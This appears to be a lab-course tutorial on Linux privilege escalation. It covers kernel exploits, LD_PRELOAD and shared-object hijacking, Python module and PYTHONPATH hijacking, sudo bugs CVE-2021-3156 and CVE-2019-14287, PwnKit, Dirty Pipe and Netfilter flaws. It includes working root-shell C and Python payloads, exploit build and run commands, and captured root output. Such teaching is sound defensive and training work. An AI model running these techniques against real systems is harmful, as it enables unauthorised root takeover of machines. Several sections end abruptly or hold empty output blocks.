Kernel level exploits exist for a variety of Linux kernel versions. A very well-known example is [Dirty COW](https://github.com/dirtycow/dirtycow.github.io) (CVE-2016-5195). These leverage vulnerabilities in the kernel to execute code with root privileges. It is very common to find systems that are vulnerable to kernel exploits. It can be hard to keep track of legacy systems, and they may be excluded from patching due to compatibility issues with certain services or applications.

Privilege escalation using a kernel exploit can be as simple as downloading, compiling, and running it. Some of these exploits work out of the box, while others require modification. A quick way to identify exploits is to issue the command `uname -a` and search Google for the kernel version.

Note: Kernel exploits can cause system instability so use caution when running these against a production system.
## Kernel Exploit Example

Let's start by checking the Kernel level and Linux OS version.

```shell-session
Poiint@htb[/htb]$ uname -a

Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

```shell-session
Poiint@htb[/htb]$ cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```

We can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A quick Google search for `linux 4.4.0-116-generic exploit` comes up with [this](https://vulners.com/zdt/1337DAY-ID-30003) exploit PoC. Next download, it to the system using `wget` or another file transfer method. We can compile the exploit code using [gcc](https://linux.die.net/man/1/gcc) and set the executable bit using `chmod +x`.

```shell-session
Poiint@htb[/htb]$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

Next, we run the exploit and hopefully get dropped into a root shell.

```shell-session
Poiint@htb[/htb]$ ./kernel_exploit 

task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
```

Finally, we can confirm root access to the box.

```shell-session
root@htb[/htb]# whoami

root
```

# Shared Libraries 

It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. Two types of libraries exist in Linux: `static libraries` (denoted by the .a file extension) and `dynamically linked shared object libraries` (denoted by the .so file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.

There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the `-rpath` or `-rpath-link` flags when compiling a program, using the environmental variables `LD_RUN_PATH` or `LD_LIBRARY_PATH`, placing libraries in the `/lib` or `/usr/lib` default directories, or specifying another directory containing the libraries within the `/etc/ld.so.conf` configuration file.

Additionally, the `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the `ldd` utility.

```shell-session
htb_student@NIX02:~$ ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

The image above lists all the libraries required by `/bin/ls`, along with their absolute paths.
## LD_PRELOAD Privilege Escalation

Let's see an example of how we can utilize the [LD_PRELOAD](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges. For this, we need a user with `sudo` privileges.

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

This user has rights to restart the Apache service as root, but since this is `NOT` a [GTFOBin](https://gtfobins.github.io/#apache) and the `/etc/sudoers` entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the `LD_PRELOAD` issue to run a custom shared library file. Let's compile the following library:

Code: c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can compile this as follows:

```shell-session
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.

```shell-session
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```

# Shared Object Hijacking 

Programs and binaries under development usually have custom libraries associated with them. Consider the following `SETUID` binary.

```shell-session
htb_student@NIX02:~$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

We can use [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) to print the shared object required by a binary or shared object. `Ldd` displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.

```shell-session
htb_student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

We see a non-standard library named `libshared.so` listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the `RUNPATH` configuration. Libraries in this folder are given preference over other folders. This can be inspected using the [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) utility.

```shell-session
htb_student@NIX02:~$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

The configuration allows the loading of libraries from the `/development` folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in `/development`, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).

```shell-session
htb_student@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

Before compiling a library, we need to find the function name called by the binary.

```shell-session
htb_student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```shell-session
htb_student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

```shell-session
htb_student@NIX02:~$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

We can copy an existing library to the `development` folder. Running `ldd` against the binary lists the library's path as `/development/libshared.`so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named `dbquery`. We can compile a shared object which includes this function.

Code: c

```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

```

The `dbquery` function sets our user id to 0 (root) and executing `/bin/sh` when called. Compile it using [GCC](https://linux.die.net/man/1/gcc).

```shell-session
htb_student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so
```

Executing the binary again should display the banner and pops a root shell.

```shell-session
htb_student@NIX02:~$ ./payroll 

***************Inlane Freight Employee Database***************

```

# Python Library Hijacking 
## Wrong Write Permissions
For example, we can imagine that we are in a developer's host on the company's intranet and that the developer is working with python. So we have a total of three components that are connected. This is the actual python script that imports a python module and the privileges of the script as well as the permissions of the module.

One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If `SUID`/`SGID` permissions have been assigned to the Python script that imports this module, our code will automatically be included.

If we look at the set permissions of the `mem_status.py` script, we can see that it has a `SUID` set.

Python Script

```shell-session
htb-student@lpenix:~$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

So we can execute this script with the privileges of another user, in our case, as `root`. We also have permission to view the script and read its contents.

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

So this script is quite simple and only shows the available virtual memory in percent. We can also see in the second line that this script imports the module `psutil` and uses the function `virtual_memory()`.

So we can look for this function in the folder of `psutil` and check if this module has write permissions for us.

Module Permissions

```shell-session
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Such permissions are most common in developer environments where many developers work on different scripts and may require higher privileges.

```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

This is the part in the library where we can insert our code. It is recommended to put it right at the beginning of the function. There we can insert everything we consider correct and effective. We can import the module `os` for testing purposes, which allows us to execute system commands. With this, we can insert the command `id` and check during the execution of the script if the inserted code is executed.

```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Now we can run the script with `sudo` and check if we get the desired result.

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

## Library Path

In Python, each version has a specified order in which libraries (`modules`) are searched and imported from. The order in which Python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. We can see this by issuing the following command:

#### PYTHONPATH Listing

PYTHONPATH Listing

```shell-session
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

In order for this to make a bit more sense, let us continue with the previous example and show how this can be exploited. Previously, the `psutil` module was imported into the `mem_status.py` script. We can see `psutil`'s default installation location by issuing the following command:

```shell-session
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

From this example, we can see that `psutil` is installed in the following path: `/usr/local/lib/python3.8/dist-packages`. From our previous listing of the `PYTHONPATH` variable, we have a reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us `write` access to any of them. Let us check.

```shell-session
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

After checking all of the directories listed, it appears that `/usr/lib/python3.8` path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the `PYTHONPATH` variable, we can see that this path is higher on the list than the path in which `psutil` is installed in. Let us try abusing this misconfiguration to create our own `psutil` module containing our own malicious `virtual_memory()` function within the `/usr/lib/python3.8` directory.

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

In order to get to this point, we need to create a file called `psutil.py` containing the contents listed above in the previously mentioned directory. It is very important that we make sure that the module we create has the same name as the import as well as have the same function with the correct number of arguments passed to it as the function we are intending to hijack. This is critical as without either of these conditions being `true`, we will not be able perform this attack. After creating this file containing the example of our previous hijacking script, we have successfully prepped the system for exploitation.

Let us once again run the `mem_status.py` script using `sudo` like in the previous example.

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 
```

As we can see from the output, we have successfully gained execution as `root` through hijacking the module's path via a misconfiguration in the permissions of the `/usr/lib/python3.8` directory.

## PYTHONPATH Environment Variable
In the previous section, we touched upon the term `PYTHONPATH`, however, didn't fully explain it's use and importance regarding the functionality of Python. `PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a `user-defined` location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:

#### Checking sudo permissions

Checking sudo permissions

```shell-session
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

As we can see from the example, we are allowed to run `/usr/bin/python3` under the trusted permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set. It is important to note, that due to the trusted nature of `sudo`, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program. Let's try to do so now using the `psutil.py` script from the last section.

#### Privilege Escalation using PYTHONPATH Environment Variable

Privilege Escalation using PYTHONPATH Environment Variable

```shell-session
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

In this example, we moved the previous python script from the `/usr/lib/python3.8` directory to `/tmp`. From here we once again call `/usr/bin/python3` to run `mem_stats.py`, however, we specify that the `PYTHONPATH` variable contain the `/tmp` directory so that it forces Python to search that directory looking for the `psutil` module to import. As we can see, we once again have successfully run our script under the context of root.

# Sudo (0-days)

The program `sudo` is used under UNIX operating systems like Linux or macOS to start processes with the rights of another user. In most cases, commands are executed that are only available to administrators. It serves as an additional layer of security or a safeguard to prevent the system and its contents from being damaged by unauthorized users. The `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.

```shell-session
cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
[sudo] password for cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:

- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- and others

To find out the version of `sudo`, the following command is sufficient:

```shell-session
cry0l1t3@nix02:~$ sudo -V | head -n1

Sudo version 1.8.31
```

The interesting thing about this vulnerability was that it had been present for over ten years until it was discovered. There is also a public [Proof-Of-Concept](https://github.com/blasty/CVE-2021-3156) that can be used for this. We can either download this to a copy of the target system we have created or, if we have an internet connection, to the target system itself.

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

When running the exploit, we can be shown a list that will list all available versions of the operating systems that may be affected by this vulnerability.

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:

  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>

We can find out which version of the operating system we are dealing with using the following command:

```shell-session
cry0l1t3@nix02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

Next, we specify the respective ID for the version operating system and run the exploit with our payload.

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

# id

```
## Sudo Policy Bypass

Another vulnerability was found in 2019 that affected all versions below `1.8.28`, which allowed privileges to escalate even with a simple command. This vulnerability has the [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) and requires only a single prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.

```shell-session
cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

In fact, `Sudo` also allows commands with specific user IDs to be executed, which executes the command with the user's privileges carrying the specified ID. The ID of the specific user can be read from the `/etc/passwd` file.

```shell-session
cry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3

cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

Thus the ID for the user `cry0l1t3` would be `1005`. If a negative ID (`-1`) is entered at `sudo`, this results in processing the ID `0`, which only the `root` has. This, therefore, led to the immediate root shell.

```shell-session
cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

# Polkit (0-days)

PolicyKit (`polkit`) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so. To check whether the user software is authorized for this instruction, `polkit` is asked. It is possible to set how permissions are granted by default for each user and application. For example, for each user, it can be set whether the operation should be generally allowed or forbidden, or authorization as an administrator or as a separate user with a one-time, process-limited, session-limited, or unlimited validity should be required. For individual users and groups, the authorizations can be assigned individually.

Polkit works with two groups of files.

1. actions/policies (`/usr/share/polkit-1/actions`)
2. rules (`/usr/share/polkit-1/rules.d`)

Polkit also has `local authority` rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory `/etc/polkit-1/localauthority/50-local.d` with the file extension `.pkla`.

PolKit also comes with three additional programs:

- `pkexec` - runs a program with the rights of another user or with root rights
- `pkaction` - can be used to display actions
- `pkcheck` - this can be used to check if a process is authorized for a specific action

The most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.

```shell-session
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

In the `pkexec` tool, the memory corruption vulnerability with the identifier [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034) was found, also known as [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) and also leads to privilege escalation. This vulnerability was also hidden for more than ten years, and no one can precisely say when it was discovered and exploited. Finally, in November 2021, this vulnerability was published and fixed two months later.

To exploit this vulnerability, we need to download a [PoC](https://github.com/arthepsy/CVE-2021-4034) and compile it on the target system itself or a copy we have made.

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
```

Once we have compiled the code, we can execute it without further ado. After the execution, we change from the standard shell (`sh`) to Bash (`bash`) and check the user's IDs.

```shell-session
cry0l1t3@nix02:~$ ./poc

# id

uid=0(root) gid=0(root) groups=0(root)
```

# Dirty Pipe (0-days)

A vulnerability in the Linux kernel, named [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the [Dirty Cow](https://dirtycow.ninja/) vulnerability discovered in 2016. All kernels from version `5.8` to `5.17` are affected and vulnerable to this vulnerability.

In simple terms, this vulnerability allows a user to write to arbitrary files as long as he has read access to these files. It is also interesting to note that Android phones are also affected. Android apps run with user rights, so a malicious or compromised app could take over the phone.

This vulnerability is based on pipes. Pipes are a mechanism of unidirectional communication between processes that are particularly popular on Unix systems. For example, we could edit the `/etc/passwd` file and remove the password prompt for the root. This would allow us to log in with the `su` command without the password prompt.

To exploit this vulnerability, we need to download a [PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) and compile it on the target system itself or a copy we have made.

#### Download Dirty Pipe Exploit

Download Dirty Pipe Exploit

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh
```

After compiling the code, we have two different exploits available. The first exploit version (`exploit-1`) modifies the `/etc/passwd` and gives us a prompt with root privileges. For this, we need to verify the kernel version and then execute the exploit.

Verify Kernel Version

```shell-session
cry0l1t3@nix02:~$ uname -r

5.13.0-46-generic
```

```shell-session
cry0l1t3@nix02:~$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

With the help of the 2nd exploit version (`exploit-2`), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:

```shell-session
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh

/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
```

Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.

```shell-session
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo

```

# Netfilter (0-days)

`Netfilter` is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules. `Netfilter` is also called the software layer in the Linux kernel. When network packets are received and sent, it initiates the execution of other modules such as packet filters. These modules can then intercept and manipulate packets. This includes the programs like `iptables` and `arptables`, which serve as action mechanisms of the `Netfilter` hook system of the IPv4 and IPv6 protocol stack.When the module is activated, all IP packets are checked by the `Netfilter` before they are forwarded to the target application of the own or remote system. In 2021 ([CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)), 2022 ([CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)), and also in 2023 ([CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)), several vulnerabilities were found that could lead to privilege escalation.

#### CVE-2022-25636

A recent vulnerability is [CVE-2022-25636](https://www.cvedetails.com/cve/CVE-2022-25636/) and affects Linux kernel 5.4 through 5.6.10. This is `net/netfilter/nf_dup_netdev.c`, which can grant root privileges to local users due to heap out-of-bounds write. `Nick Gregory` wrote a very detailed [article](https://nickgregory.me/post/2022/03/12/cve-2022-25636/) about how he discovered this vulnerability.

CVE-2022-25636

```shell-session
cry0l1t3@ubuntu:~$ uname -r

5.13.0-051300-generic
```

However, we need to be careful with this exploit as it can corrupt the kernel, and a reboot will be required to reaccess the server.

#### CVE-2023-32233

This vulnerability exploits the so called `anonymous sets` in `nf_tables` by using the `Use-After-Free` vulnerability in the Linux Kernel up to version `6.3.1`. These `nf_tables` are temprorary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (`Use-After-Free`) so they cannot be used anymore. Due to a mistake in the code, these anonymous sets are not being handled properly and can still be accessed and modified by the program.

The exploitation is done by manipulating the system to use the `cleared out` anonymous sets to interact with the kernel's memory. By doing so, we can potentially gain `root` privileges.
